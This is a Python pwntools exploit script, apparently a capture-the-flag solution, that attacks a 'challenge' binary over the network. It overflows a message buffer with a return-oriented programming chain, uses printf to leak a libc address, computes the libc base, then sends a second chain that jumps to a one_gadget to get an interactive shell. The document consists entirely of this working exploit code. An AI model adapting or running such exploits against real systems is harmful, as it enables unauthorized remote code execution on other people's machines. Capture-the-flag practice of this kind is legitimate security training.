import argparse
import codecs
import leb128
import math
import threading

from pwn import *

context.log_level = 'debug'
# context.log_level = 'error'
context.terminal = ['tmux', 'splitw', '-h']

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")

args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

# r = process(['./challenge'])
# gdb.attach(r, f'''
# b *0x4016ff
# b *main + 5
# c
# c
# c
# ''')

c = cyclic_gen()

chain = [
    0x004012e3, # pop rsi ; retn
    0x004020c9, # "%ld: %s\n"
    0x004012e1, # pop rdi ; retn
    0x404020,
    0x0040101a, # retn
    0x00401140, # printf
    0x00401b56, # main

    # 0x004012e1, # pop rdi ; retn
    # 0x004012e7, # pop rcx ; retn
    # 0x004012e5, # pop rdx ; retn
    # 0x004012e3, # pop rsi ; retn
    # 0x0040127d, # pop rbp ; retn
]

payload = b''.join(p64(gadget) for gadget in chain)

input = b'hack ' * 23 + b'hacking ' * 2 + c.get(54) + b'AAAAAAAA' + payload

r.sendlineafter(b"Enter your choice:", b"2")
r.sendlineafter(b"Enter your message: ", input)

leak = r.recvuntil(b'1. Vie')[:-6]
leak += b'\x00' * (8 - len(leak))

strcasecmp_bin = u64(leak)

print(hex(strcasecmp_bin))

libc = strcasecmp_bin - (0x7fd7059ae2b0 - 0x00007fd705814000)

new_rbp = libc + 0x00007fe27396d000 - 0x00007fe273752000

print(f'libc base is: {libc:x}')

chain = [
    0x004012e5, # pop rdx ; retn
    0,
    0x004012e3, # pop rsi ; retn
    0,
    0x0040127d, # pop rbp ; retn
    new_rbp,
    libc + 0xebcf8, # one_gadget: rsi = NULL rdx == NULL
]

payload = b''.join(p64(gadget) for gadget in chain)

input = b'hack ' * 23 + b'hacking ' * 2 + c.get(54) + b'AAAAAAAA' + payload

r.sendlineafter(b"Enter your choice:", b"2")
r.sendlineafter(b"Enter your message: ", input)

r.interactive()
